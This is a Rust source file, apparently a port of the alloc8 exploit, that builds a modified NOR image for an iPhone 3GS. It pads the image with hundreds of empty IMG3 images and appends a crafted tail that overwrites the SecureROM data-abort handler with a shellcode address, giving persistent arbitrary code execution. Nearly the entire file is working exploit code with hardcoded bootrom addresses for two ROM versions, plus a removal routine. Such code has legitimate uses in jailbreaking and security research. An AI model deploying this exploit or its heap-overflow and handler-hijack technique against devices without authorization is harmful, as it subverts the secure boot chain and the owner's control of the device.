//! Port of `alloc8.py`: the heap feng shui exploit that turns an iPhone 3GS into a
//! "pwned DFU" device with arbitrary code execution.

use crate::nor::NorData;
use crate::shellcode::{self, Arch};
use crate::utilities::die;

/// `alloc8.empty_img3`
pub fn empty_img3(size: usize) -> Vec<u8> {
    assert!(size >= 20, "empty_img3: size must be at least 20");
    let mut out = Vec::with_capacity(size);
    out.extend_from_slice(b"3gmI"); // 'Img3'[::-1]
    for value in [size as u32, 0, 0] {
        out.extend_from_slice(&value.to_le_bytes());
    }
    out.extend_from_slice(b"orez"); // 'zero'[::-1]
    out.resize(size, 0x00);
    out
}

const CONSTANTS_359_3: &[u32] = &[
    0x8403_4000, //  1 - MAIN_STACK_ADDRESS
    0x544,       //  2 - clean_invalidate_data_cache
    0x8402_4020, //  3 - gNorImg3List
    0x1ccd,      //  4 - free
    0x3ca1,      //  5 - exit_critical_section
    0x451d,      //  6 - home_button_pressed
    0x450d,      //  7 - power_button_pressed
    0x44e1,      //  8 - cable_connected
    0x696c_6c62, //  9 - ILLB_MAGIC
    0x1f6f,      // 10 - get_nor_image
    0x8400_0000, // 11 - LOAD_ADDRESS
    0x24000,     // 12 - MAX_SIZE
    0x3969,      // 13 - jump_to
    0x38a1,      // 14 - usb_create_serial_number_string
    0x8e7d,      // 15 - strlcat
    0x349d,      // 16 - usb_wait_for_image
    0x8402_4228, // 17 - gLeakingDFUBuffer
    0x6578_6563, // 18 - EXEC_MAGIC
    0x1f79,      // 19 - memz_create
    0x1fa1,      // 20 - memz_destroy
    0x696d_6733, // 21 - IMG3_STRUCT_MAGIC
    0x4d65_6d7a, // 22 - MEMZ_STRUCT_MAGIC
    0x1fe5,      // 23 - image3_create_struct
    0x2655,      // 24 - image3_load_continue
    0x277b,      // 25 - image3_load_fail
];

const CONSTANTS_359_3_2: &[u32] = &[
    0x8403_4000, //  1 - MAIN_STACK_ADDRESS
    0x544,       //  2 - clean_invalidate_data_cache
    0x8402_4020, //  3 - gNorImg3List
    0x1ccd,      //  4 - free
    0x3ca9,      //  5 - exit_critical_section
    0x4525,      //  6 - home_button_pressed
    0x4515,      //  7 - power_button_pressed
    0x44e9,      //  8 - cable_connected
    0x696c_6c62, //  9 - ILLB_MAGIC
    0x1f77,      // 10 - get_nor_image
    0x8400_0000, // 11 - LOAD_ADDRESS
    0x24000,     // 12 - MAX_SIZE
    0x3971,      // 13 - jump_to
    0x38a9,      // 14 - usb_create_serial_number_string
    0x8e85,      // 15 - strlcat
    0x34a5,      // 16 - usb_wait_for_image
    0x8402_4228, // 17 - gLeakingDFUBuffer
    0x6578_6563, // 18 - EXEC_MAGIC
    0x1f81,      // 19 - memz_create
    0x1fa9,      // 20 - memz_destroy
    0x696d_6733, // 21 - IMG3_STRUCT_MAGIC
    0x4d65_6d7a, // 22 - MEMZ_STRUCT_MAGIC
    0x1fed,      // 23 - image3_create_struct
    0x265d,      // 24 - image3_load_continue
    0x2783,      // 25 - image3_load_fail
];

/// `alloc8.exploit`
pub fn exploit(nor: &NorData, version: &str) -> NorData {
    let (constants, exceptions): (&[u32], &[u32]) = match version {
        "359.3" => (CONSTANTS_359_3, &[0x5620, 0x5630]),
        "359.3.2" => (CONSTANTS_359_3_2, &[0x5628, 0x5638]),
        other => die(format!(
            "ERROR: SecureROM version {} is not supported by alloc8.",
            other
        )),
    };

    assert!(
        nor.alloc8_area_is_empty(),
        "alloc8: bytes following the IMG2 header in NOR are not zero"
    );
    assert!(
        nor.images.len() < 32,
        "alloc8: NOR already has too many images"
    );

    const MAX_SHELLCODE_LENGTH: usize = 460;
    let raw_shellcode = shellcode::ALLOC8;
    assert!(raw_shellcode.len() <= MAX_SHELLCODE_LENGTH);

    let widened: Vec<u64> = constants.iter().map(|c| *c as u64).collect();
    let patched = shellcode::prepare_shellcode(raw_shellcode, Arch::Armv7, &widened);

    let mut new_nor = nor.clone();
    new_nor.parts[1] = [
        patched,
        vec![0u8; MAX_SHELLCODE_LENGTH - raw_shellcode.len()],
    ]
    .concat();

    while new_nor.images.len() < 713 {
        new_nor.images.push(empty_img3(new_nor.block_size as usize));
    }

    // Image no. 714 must end at the end of the 4096-byte block.
    const NOR_READ_SIZE: usize = 4096;
    let offset: usize = new_nor.images.iter().map(|image| image.len()).sum();
    let size = NOR_READ_SIZE - offset % NOR_READ_SIZE;
    new_nor.images.push(empty_img3(size));

    // This image is copied to address 0x8. SHELLCODE_ADDRESS overrides the data abort
    // exception handler.
    const SHELLCODE_ADDRESS: u32 = 0x8402_6214 + 1;
    let mut tail = empty_img3(52);
    tail.truncate(40);
    for value in [SHELLCODE_ADDRESS, 0, exceptions[0], exceptions[1]] {
        tail.extend_from_slice(&value.to_le_bytes());
    }
    new_nor.images.push(tail);

    new_nor
}

/// `alloc8.remove_exploit`
pub fn remove_exploit(nor: &NorData) -> NorData {
    assert!(nor.images.len() >= 700, "alloc8: too few images in NOR");

    let mut new_nor = nor.clone();

    new_nor.images.retain(|image| {
        assert!(image.len() >= 20, "alloc8: image is too small to be valid");
        &image[16..20] != b"orez" // 'zero'[::-1]
    });
    assert!(
        new_nor.images.len() < 32,
        "alloc8: too many non-zero images remain"
    );

    new_nor.parts[1] = vec![0u8; 460];

    new_nor
}
